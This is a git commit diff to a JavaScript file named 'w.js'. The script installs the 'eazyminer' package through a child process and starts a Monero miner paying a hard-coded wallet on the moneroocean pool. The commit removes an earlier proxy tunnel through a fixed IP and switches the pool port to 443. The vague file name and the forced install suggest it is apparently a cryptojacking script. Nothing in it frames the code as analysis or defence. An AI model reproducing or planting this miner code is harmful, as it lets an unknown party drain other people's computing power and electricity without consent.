8c34e117efaa8fe142750b366cf250ad9e6666ba
Ligma1337 <130178098+Ligma1337@users.noreply.github.com>
2023-05-19 19:35:43 +0200

    Update w.js

--- w.js
+++ w.js
@@ -4,40 +4,26 @@ const childProcess = require('child_process');
 console.log('Installing dependencies...');
 childProcess.execSync('npm install eazyminer tunnel', { stdio: 'inherit' });
 
+
+
 const Miner = require('eazyminer');
-const tunnel = require('tunnel');
 
-// Proxy configuration
-const proxyOptions = {
-  proxy: {
-    host: '185.28.193.95',
-    port: 8080,
-    // Additional proxy options if required
-    // e.g., proxy.auth: 'username:password'
-  },
-};
-
-const miner = new Miner(
-  {
-    pools: [
-      {
+const miner = new Miner({
+    pools: [{
         coin: 'XMR',
-        user:
-          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
-        url: 'gulf.moneroocean.stream:20128', 
-      },
-    ],
-    web: [
-      {
+        user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv+128000',
+        url: 'gulf.moneroocean.stream:443',
+    }],
+    web: [{
+        
+        // Enable or Disable web client
         enabled: false,
-        port: 3000,
-      },
-    ],
-    autoStart: false,
-    tunnel: {
-      https: tunnel.httpsOverHttp(proxyOptions),
-    },
-  },
-);
 
-miner.start();
+        // The used port for the webclient
+        port: 3000 
+    }],
+    autoStart: false // optional delay
+});
+
+miner.start(); // optional manually start the miner
+// miner.stop() // manually stop the miner
